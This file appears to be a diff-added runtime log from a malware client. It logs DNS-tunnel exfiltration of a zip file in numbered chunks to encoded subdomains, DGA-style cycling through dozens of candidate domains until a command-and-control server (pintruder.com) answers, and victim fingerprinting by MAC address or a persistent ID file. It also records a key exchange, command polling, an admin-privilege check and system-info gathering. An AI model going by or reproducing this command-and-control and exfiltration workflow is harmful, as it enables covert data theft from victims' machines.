+2025-07-05 17:49:36,723 - Exfil: Data Chunk 11 to 000011.fyplbhhwy4kov3ux54vr4ksq2leggpj4iwtslnl5.it7muxe6y3fh5nzzmbxi7soxnvplmehw... ACKed (Server: ACK:000011)
+2025-07-05 17:49:37,253 - Exfil: Data Chunk 12 to 000012.33cuxuxnqmy5gpotxjzzsi3j7xiqaeyfmyedqzpc.5jj5g7ortpswkow76fnldaqhxy4zxnku... ACKed (Server: ACK:000012)
+2025-07-05 17:49:37,797 - Exfil: Data Chunk 13 to 000013.cfcq2rys4b3yrkdogz5xbkvk6ja3myy4novi43vo.vzzqqkznrmkuwmdfoct74w5h6onyeksq... ACKed (Server: ACK:000013)
+2025-07-05 17:49:38,309 - Exfil: Data Chunk 14 to 000014.cnbtbvj572qji4zgqra4qwfjtawh5oaapcfxyh4d.iqddg7ym5v4yq7gqepouc5q64nohacpo... ACKed (Server: ACK:000014)
+2025-07-05 17:49:38,910 - Exfil: Data Chunk 15 to 000015.b3d7gauzo7jaoeo2rt7opo7pd6sensv5y4eldgwi.gfxagyjalwilfnv4kl4ffx2xs533546l... ACKed (Server: ACK:000015)
+2025-07-05 17:49:39,036 - [Main Thread] Shutdown signal (Ctrl+C) received. Exiting.
+2025-07-05 17:49:39,333 - Exfil: Data Chunk 16 to 000016.rcxglvkl7p6mmjm5bnaqfjwdtqqg722ccngscfl7.6jnhhy2gdtffz3xsccd7562thnblkdp3... ACKed (Server: ACK:000016)
+2025-07-05 17:57:39,843 - Client starting... Initial beacon delay for 14s.
+2025-07-05 17:57:57,442 - Cached Method 'GetmacExe' failed for 'iface' lookup with unhandled exception: 'utf-8' codec can't decode byte 0xc0 in position 2: invalid start byte
+2025-07-05 17:57:57,442 - Falling back to 'IpconfigExe' for unusable method 'GetmacExe'
+2025-07-05 17:57:57,564 - Cached Method 'IpconfigExe' failed for 'iface' lookup with unhandled exception: 'utf-8' codec can't decode byte 0xb1 in position 13: invalid start byte
+2025-07-05 17:57:57,564 - Falling back to 'WmicExe' for unusable method 'IpconfigExe'
+2025-07-05 17:57:58,607 - MAC address  is not 17 characters long!
+2025-07-05 17:57:58,607 - Failed to retrieve MAC address. Will try persistent ID file.
+2025-07-05 17:57:58,607 - Using ID from persistent file: E:\ccit\.persistent_client_id_v4.dat (ID: a7bf332e-2be3-48...)
+2025-07-05 17:57:58,607 - Victim ID base established using method: PersistentFile, Base: 'a7bf332e-2be3-4827-b...'
+2025-07-05 17:57:58,607 - [Main Thread] Victim ID established: B1oVyzcEdH0mRAFC
+2025-07-05 17:57:58,607 - [Main Thread] Current Run Session ID: e6820109c63c
+2025-07-05 17:57:58,618 - [Main Thread] Attempting to resolve a new C2 domain...
+2025-07-05 17:57:58,707 -  -> nvqhhcghygu.pw ... [SKIP] NXDOMAIN
+2025-07-05 17:57:58,958 -  -> fypmvfo.eu ... [SKIP] NXDOMAIN
+2025-07-05 17:57:59,286 -  -> dkvsnef.org ... [SKIP] NXDOMAIN
+2025-07-05 17:57:59,695 -  -> gjstuec.pw ... [SKIP] NXDOMAIN
+2025-07-05 17:57:59,866 -  -> wphncjdjrphqrux.ml ... [SKIP] NXDOMAIN
+2025-07-05 17:58:00,130 -  -> teqehmt.info ... [SKIP] NXDOMAIN
+2025-07-05 17:58:00,328 -  -> sqvivfkigsl.ml ... [SKIP] NXDOMAIN
+2025-07-05 17:58:00,592 -  -> memyeghggig.net ... [SKIP] NXDOMAIN
+2025-07-05 17:58:00,777 -  -> smmvqmh.org ... [SKIP] NXDOMAIN
+2025-07-05 17:58:01,176 -  -> cgddbwysotj.in ... [SKIP] NXDOMAIN
+2025-07-05 17:58:01,498 -  -> qlldfidqfty.net ... [SKIP] NXDOMAIN
+2025-07-05 17:58:01,785 -  -> pbiojqmheau.net ... [SKIP] NXDOMAIN
+2025-07-05 17:58:02,020 -  -> iokbpru.org ... [SKIP] NXDOMAIN
+2025-07-05 17:58:02,312 -  -> absqtcmwwiy.xyz ... [SKIP] NXDOMAIN
+2025-07-05 17:58:02,621 -  -> pwyxxfs.top ... [SKIP] NXDOMAIN
+2025-07-05 17:58:02,874 -  -> jsbpfambaayhefq.pw ... [SKIP] NXDOMAIN
+2025-07-05 17:58:03,108 -  -> afbvphfilixmrly.info ... [SKIP] NXDOMAIN
+2025-07-05 17:58:03,411 -  -> miuyfwjjesmncwt.info ... [SKIP] NXDOMAIN
+2025-07-05 17:58:03,629 -  -> gvmyarryrtvbuml.org ... [SKIP] NXDOMAIN
+2025-07-05 17:58:03,858 -  -> ccbnreo.us ... [SKIP] NXDOMAIN
+2025-07-05 17:58:04,262 -  -> dxhkxnqeurp.in ... [SKIP] NXDOMAIN
+2025-07-05 17:58:04,588 -  -> laojlvfkygyfccx.org ... [SKIP] NXDOMAIN
+2025-07-05 17:58:04,807 -  -> yututpayisdlklx.org ... [SKIP] NXDOMAIN
+2025-07-05 17:58:05,036 -  -> fdxljjkalgq.ml ... [SKIP] NXDOMAIN
+2025-07-05 17:58:05,200 -  -> yqpeohurpdq.us ... [SKIP] NXDOMAIN
+2025-07-05 17:58:05,429 -  -> kkfxpafpkkcpptf.top ... [SKIP] NXDOMAIN
+2025-07-05 17:58:05,746 -  -> ikbkgsafokwipgh.us ... [SKIP] NXDOMAIN
+2025-07-05 17:58:05,947 -  -> vxxfofnxjtpcrlr.xyz ... [SKIP] NXDOMAIN
+2025-07-05 17:58:06,222 -  -> vchsiia.in ... [SKIP] NXDOMAIN
+2025-07-05 17:58:06,389 -  -> hryjnnh.info ... [SKIP] NXDOMAIN
+2025-07-05 17:58:06,699 - [OK] pintruder.com is alive, C2 domain set.
+2025-07-05 17:58:06,699 - [Main Thread] Using C2 domain: pintruder.com
+2025-07-05 17:58:06,705 - Attempting to establish session key with C2 domain: pintruder.com
+2025-07-05 17:58:06,828 - Attempting key exchange with https://pintruder.com/api/key_exchange/B1oVyzcEdH0mRAFC
+2025-07-05 17:58:07,188 - Session key successfully derived and established.
+2025-07-05 17:58:07,205 - [Main Thread] Initialization complete. Starting C2 threads.
+2025-07-05 17:58:07,205 - [API Thread] Starting API C2 loop with domain: pintruder.com.
+2025-07-05 17:58:07,205 - [Main Thread] All threads started. Monitoring threads...
+2025-07-05 17:58:07,221 - [DNS Thread] Starting DNS operations.
+2025-07-05 17:58:07,440 - Admin privilege check: True
+2025-07-05 17:58:08,231 - [Main Thread] Shutdown signal (Ctrl+C) received. Exiting.
+2025-07-05 17:58:08,254 - Could not gather Hotfix info: Command 'wmic qfe list brief' returned non-zero exit status 3221225786.
+2025-07-05 17:58:08,256 - Finished gathering system info: OS=Windows 11 Core (Build 22631), Host=BOOK-G7PEMEUQ9O
+2025-07-05 17:58:08,256 - API Poll: Polling https://pintruder.com/api/commands/B1oVyzcEdH0mRAFC with session e6820109c63c and system_info.
+2025-07-05 17:58:08,304 - [DNS Thread] Failed to determine real user path: Command '['powershell', '-Command', '(Get-CimInstance -ClassName Win32_ComputerSystem).UserName']' returned non-zero exit status 1.
+2025-07-05 17:58:08,304 - [DNS Thread] Found existing 'modified_files.zip'. Attempting exfiltration.
+2025-07-05 17:58:08,304 - [DNS Thread] Starting exfiltration for 'C:\Windows\System32\config\systemprofile\AppData\Local\aaa\modified_files.zip'. This may take a while.
+2025-07-05 17:58:08,304 - [DNS Thread] Generated stable exfil session ID: 251c6f53bbdc
+2025-07-05 17:58:08,540 - Received server state from init.251c6f53bbdc.8e9a01.pintruder.com...: {'last_chunk': -1}
+2025-07-05 17:58:08,572 - API Poll: No new commands from API (https://pintruder.com/api/commands/B1oVyzcEdH0mRAFC).
+2025-07-05 18:06:26,120 - Client starting... Initial beacon delay for 5s.
+2025-07-05 18:06:31,128 - Attempting to get MAC address using uuid.getnode().
+2025-07-05 18:06:31,130 - Successfully retrieved MAC address via uuid.getnode(): 00:A5:54:E0:EB:37
+2025-07-05 18:06:31,130 - Using MAC address from uuid.getnode() for victim ID base: 00:A5:54:E0:EB:37
+2025-07-05 18:06:31,130 - Victim ID base established using method: MAC, Base: '00:A5:54:E0:EB:37...'
+2025-07-05 18:06:31,132 - [Main Thread] Victim ID established: ti8OJnGBLdoceZJU
+2025-07-05 18:06:31,132 - [Main Thread] Current Run Session ID: 427b14be36f8
+2025-07-05 18:06:31,134 - [Main Thread] Attempting to resolve a new C2 domain...
+2025-07-05 18:06:31,226 -  -> smmvqmh.org ... [SKIP] NXDOMAIN
+2025-07-05 18:06:31,423 -  -> yqpeohurpdq.us ... [SKIP] NXDOMAIN
+2025-07-05 18:06:31,667 -  -> jsbpfambaayhefq.pw ... [SKIP] NXDOMAIN
+2025-07-05 18:06:32,012 -  -> ikbkgsafokwipgh.us ... [SKIP] NXDOMAIN
+2025-07-05 18:06:32,402 -  -> nvqhhcghygu.pw ... [SKIP] NXDOMAIN
+2025-07-05 18:06:32,621 -  -> dkvsnef.org ... [SKIP] NXDOMAIN
+2025-07-05 18:06:32,842 -  -> gvmyarryrtvbuml.org ... [SKIP] NXDOMAIN
+2025-07-05 18:06:33,240 -  -> cgddbwysotj.in ... [SKIP] NXDOMAIN
+2025-07-05 18:23:20,996 - Client starting... Initial beacon delay for 19s.
+2025-07-05 18:23:40,011 - Attempting to get MAC address using uuid.getnode().
+2025-07-05 18:23:40,027 - Successfully retrieved MAC address via uuid.getnode(): 00:A5:54:E0:EB:37
+2025-07-05 18:23:40,092 - Using MAC address from uuid.getnode() for victim ID base: 00:A5:54:E0:EB:37
+2025-07-05 18:23:40,094 - Victim ID base established using method: MAC, Base: '00:A5:54:E0:EB:37...'
+2025-07-05 18:23:40,100 - [Main Thread] Victim ID established: ti8OJnGBLdoceZJU
+2025-07-05 18:23:40,103 - [Main Thread] Current Run Session ID: eb838f074e1a
+2025-07-05 18:23:40,105 - [Main Thread] Attempting to resolve a new C2 domain...
+2025-07-05 18:23:40,188 -  -> gjstuec.pw ... [SKIP] NXDOMAIN
+2025-07-05 18:23:40,432 -  -> fdxljjkalgq.ml ... [SKIP] NXDOMAIN
+2025-07-05 18:23:40,712 -  -> gvmyarryrtvbuml.org ... [SKIP] NXDOMAIN
+2025-07-05 18:23:40,902 -  -> yqpeohurpdq.us ... [SKIP] NXDOMAIN
+2025-07-05 18:23:41,139 -  -> qlldfidqfty.net ... [SKIP] NXDOMAIN
+2025-07-05 18:23:41,509 -  -> cgddbwysotj.in ... [SKIP] NXDOMAIN
+2025-07-05 18:23:41,766 -  -> vxxfofnxjtpcrlr.xyz ... [SKIP] NXDOMAIN
+2025-07-05 18:23:42,080 -  -> afbvphfilixmrly.info ... [SKIP] NXDOMAIN
+2025-07-05 18:23:42,260 -  -> pwyxxfs.top ... [SKIP] NXDOMAIN
+2025-07-05 18:23:42,524 -  -> wphncjdjrphqrux.ml ... [SKIP] NXDOMAIN
